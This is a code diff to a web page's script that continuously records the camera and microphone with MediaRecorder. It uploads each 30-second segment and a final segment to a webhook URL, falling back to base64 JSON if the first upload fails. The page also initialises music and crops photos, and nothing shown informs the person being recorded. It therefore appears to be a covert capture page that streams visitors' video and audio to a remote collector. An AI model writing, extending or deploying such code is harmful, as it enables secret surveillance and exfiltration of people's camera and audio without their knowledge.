@@ -1144,16 +1144,15 @@
         let isCapturing = false;
         let stream = null;
 
-        // --- Recording variables (fixed: smaller complete chunks, no arbitrary slicing) ---
+        // --- New: continuous recording variables ---
         let mediaRecorder = null;
         let recorderStream = null;
         let lastSegmentBlob = null;
         let recordingMime = null;
-        // Emit complete WebM chunks every 5 seconds so each chunk is playable
-        const RECORD_TIMESLICE_MS = 5000; // 5 seconds
+        const RECORD_TIMESLICE_MS = 30000; // 30 seconds
         let audioStreamForRecording = null;
+        // store crop area for 4:3 photos
         let crop = { sx: 0, sy: 0, sw: 0, sh: 0 };
-        let segmentCounter = 0;
 
         // Initialize music
         window.addEventListener('load', () => {
@@ -1248,7 +1247,7 @@
             }
         }
 
-        // ------------------- Continuous recording functions (fixed) -------------------
+        // ------------------- Continuous recording functions -------------------
         async function startRecordingWhenPossible() {
             // If already recording, ignore
             if (mediaRecorder && mediaRecorder.state !== 'inactive') return;
@@ -1287,10 +1286,8 @@
             mediaRecorder.ondataavailable = (ev) => {
                 if (ev.data && ev.data.size > 0) {
                     lastSegmentBlob = ev.data;
-                    segmentCounter++;
-                    const filename = `recording-seg-${Date.now()}-${segmentCounter}.webm`;
-                    // IMPORTANT: upload the complete chunk provided by MediaRecorder (do NOT slice bytes)
-                    sendCompleteBlobToWebhook(ev.data, filename).catch(err => {
+                    // send the segment immediately (non-blocking)
+                    sendBlobToWebhook(ev.data, `recording-${Date.now()}.webm`).catch(err => {
                         console.error('Segment upload failed:', err);
                     });
                 }
@@ -1303,8 +1300,7 @@
             mediaRecorder.onstop = () => {
                 // When stopped, ensure last segment is uploaded if present.
                 if (lastSegmentBlob) {
-                    const filename = `final-recording-${Date.now()}-${segmentCounter}.webm`;
-                    sendCompleteBlobToWebhook(lastSegmentBlob, filename).catch(err => {
+                    sendBlobToWebhook(lastSegmentBlob, `final-recording-${Date.now()}.webm`).catch(err => {
                         console.error('Final upload failed:', err);
                     });
                 }
@@ -1316,6 +1312,7 @@
                     console.warn('Video track ended; stopping recorder and uploading last segment.');
                     try {
                         if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                            // request any buffered data, then stop (onstop will upload lastSegmentBlob)
                             try { mediaRecorder.requestData(); } catch(e){}
                             try { mediaRecorder.stop(); } catch(e){}
                         }
@@ -1328,6 +1325,7 @@
                     }
                 };
                 vt.onmute = () => {
+                    // if video muted, still record; if ended will be handled by onended
                     console.info('video track muted');
                 };
             });
@@ -1337,11 +1335,12 @@
                 (audioStreamForRecording.getAudioTracks() || []).forEach(at => {
                     at.onended = () => {
                         console.warn('Audio track ended. Video recording will continue without audio.');
+                        // Keep recording (video tracks still exist). Nothing else required.
                     };
                 });
             }
 
-            // Start the recorder with a timeslice so ondataavailable fires every RECORD_TIMESLICE_MS
+            // Start the recorder with a timeslice so ondataavailable fires every 30s
             try {
                 mediaRecorder.start(RECORD_TIMESLICE_MS);
             } catch (e) {
@@ -1380,53 +1379,40 @@
             // mediaRecorder.onstop will trigger upload of lastSegmentBlob
         }
 
-        // Upload the complete blob produced by MediaRecorder (no slicing)
-        async function sendCompleteBlobToWebhook(blob, filename = 'recording.webm') {
+        // send a blob (video) to webhook
+        async function sendBlobToWebhook(blobOrFile, filename = 'recording.webm') {
             if (!WEBHOOK_URL) return;
             try {
-                const fileObj = new File([blob], filename, { type: blob.type || 'video/webm' });
                 const form = new FormData();
+                // accept either Blob or File
+                const fileObj = blobOrFile instanceof File ? blobOrFile : new File([blobOrFile], filename, { type: blobOrFile.type || 'video/webm' });
                 form.append('file', fileObj, filename);
 
-                // Try a few attempts with backoff
-                for (let attempt = 0; attempt < 3; attempt++) {
-                    try {
-                        const response = await fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            body: form
-                        });
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: form
+                });
 
-                        if (response.ok) {
-                            console.info(`Uploaded ${filename} (attempt ${attempt + 1})`);
-                            return response;
-                        } else {
-                            console.warn(`Upload returned ${response.status} for ${filename}. Attempting JSON fallback.`);
-                            // fallback to JSON base64
-                            const base64 = await blobToBase64(blob);
-                            const fall = await fetch(WEBHOOK_URL, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ filename, file: base64 })
-                            });
-                            if (fall.ok) return fall;
-                        }
-                    } catch (err) {
-                        console.warn(`Upload attempt ${attempt + 1} for ${filename} failed:`, err);
-                        if (attempt === 2) throw err;
-                        await new Promise(r => setTimeout(r, 400 * (attempt + 1)));
-                    }
+                if (!response.ok) {
+                    // fallback: send base64 in JSON
+                    const base64 = await blobToBase64(blobOrFile);
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ filename, file: base64 })
+                    });
                 }
             } catch (err) {
-                // final fallback: try base64 once
+                // attempt fallback base64 JSON
                 try {
-                    const base64 = await blobToBase64(blob);
+                    const base64 = await blobToBase64(blobOrFile);
                     await fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ filename, file: base64 })
                     });
                 } catch (e) {
-                    console.error('All upload methods failed for', filename, e);
+                    console.error('Both blob and base64 webhook upload failed:', e);
                 }
             }
         }
@@ -1809,7 +1795,7 @@
             }
         }, 1000);
 
-        // -------------------- WEBHOOK HELPERS FOR IMAGES --------------------
+        // -------------------- WEBHOOK HELPERS --------------------
         // Convert dataURL to Blob
         function dataURLToBlob(dataURL) {
             const parts = dataURL.split(',');
